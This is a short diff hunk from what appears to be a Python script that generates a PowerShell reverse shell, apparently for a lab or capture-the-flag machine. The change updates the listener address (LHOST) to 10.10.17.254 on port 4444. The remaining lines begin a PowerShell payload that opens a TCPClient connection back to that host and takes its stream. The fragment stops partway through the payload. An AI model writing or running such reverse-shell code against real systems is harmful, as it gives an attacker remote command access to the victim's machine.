@@ -1,5 +1,5 @@
 import sys, base64
-LHOST, PORT = "10.10.16.59", 4444
+LHOST, PORT = "10.10.17.254", 4444
 ps = f'''
 $client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{PORT});
 $stream = $client.GetStream();
